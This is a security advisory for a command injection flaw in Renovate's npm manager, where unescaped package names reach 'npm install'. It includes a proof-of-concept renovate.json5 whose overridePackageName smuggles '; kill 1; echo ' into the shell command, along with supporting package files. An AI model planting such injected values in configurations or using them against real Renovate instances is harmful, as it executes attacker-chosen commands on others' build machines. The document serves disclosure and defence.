# [M] Renovate vulnerable to arbitrary command injection via npm manager and malicious Renovate configuration

## Summary
Severity: Medium
Advisory: GHSA-fr4j-65pv-gjjj
CWE: CWE-77
Ecosystem: npm
CVSS: CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-01-13
Source: https://github.com/advisories/GHSA-fr4j-65pv-gjjj
Type: github-advisory

## Affected
- npm: `renovate` — affected >=35.63.0 <40.33.0

## Details
### Summary
The user-provided string `packageName` in the `npm` manager is appended to the `npm install` command during lock maintenance without proper sanitization.


### Details
Adversaries can provide a maliciously crafted Renovate configuration file to trick Renovate to execute arbitrary code.
The user-provided workspace names and package keys that are added to the `updateCmd` variables in [lib/modules/manager/npm/post-update/npm.ts](https://github.com/renovatebot/renovate/blob/5bdaf47eebde770107017c47557bca41189db588/lib/modules/manager/npm/post-update/npm.ts) are not being escaped using the `quote` function from the `shlex` package.
This lack of proper sanitization has been present in the product since version 35.63.0 (https://github.com/renovatebot/renovate/commit/012c0ac2fe32832e60a62bde405c0a241efd314c), released on April 27 of 2023.

### PoC
1. Create a git repo with the following content:

`renovate.json5`:

```json5
{
  $schema: "https://docs.renovatebot.com/renovate-schema.json",
  customDatasources: {
    always: {
      defaultRegistryUrlTemplate: "https://docs.renovatebot.com/search/search_index.json",
      transformTemplates: ['{"releases":[{"version":"11.1.0"}]}'],
    },
  },
  packageRules: [
    {
      // Target of the day
      matchManagers: ["npm"],
      // Provide a command in the package name
      overridePackageName: "; kill 1; echo ",
      // Override the datasource to prevent a lookup failure
      overrideDatasource: "custom.always",
    },
  ],
}

```


`package.json`:

```json
{
  "name": "renovate-aci-4",
  "version": "0.0.1",
  "dependencies": {
    "uuid": "^11.0.0"
  }
}
```


`package-lock.json`:

```json
{
  "name": "renovate-aci-4",
  "version": "0.0.1",
  "lockfileVersion": 3,
  "requires": true,
  "packages": {
    "": {
      "name": "renovate-aci-4",
      "version": "0.0.1",
      "dependencies": {
        "uuid": "^11.0.0"
      }
    },
    "node_modules/uuid": {
      "version": "11.0.0",
      "resolved": "https://registry.npmjs.org/uuid/-/uuid-11.0.0.tgz",
      "integrity": "sha512-iE8Fa5fgBY4rN5GvNUJ8TSwO1QG7TzdPfhrJczf6XJ6mZUxh/GX433N70fCiJL9h8EKP5ayEIo0Q6EBQGWHFqA==",
      "funding": [
        "https://github.com/sponsors/broofa",
        "https://github.com/sponsors/ctavan"
      ],
      "license": "MIT",
      "bin": {
        "uuid": "dist/esm/bin/uuid"
      }
    }
  }
}

```

2. Run Renovate against the repo from a Docker container. Notice that the process terminates without reporting "Repository finished", because the ACI vulnerability allowed for execution of `kill 1`, terminating the root process of the container.

> [!NOTE]
> This specific proof of concept relies on the introduction of the `overrideDatasource` and `overridePackageName` configuration, available since version 38.120.0 (https://github.com/renovatebot/renovate/commit/a70a6a376d31148e80be5a5c885ac33ff5ddb30c), released on October 12 of 2024.

### Impact
This is a Arbitrary Command Injection vulnerability, allowing those with write access on repositories configured to be scanned by Renovate to cause the execution of commands of their choice on the machine that runs Renovate.

## References
- https://github.com/renovatebot/renovate/security/advisories/GHSA-fr4j-65pv-gjjj
- https://github.com/renovatebot/renovate
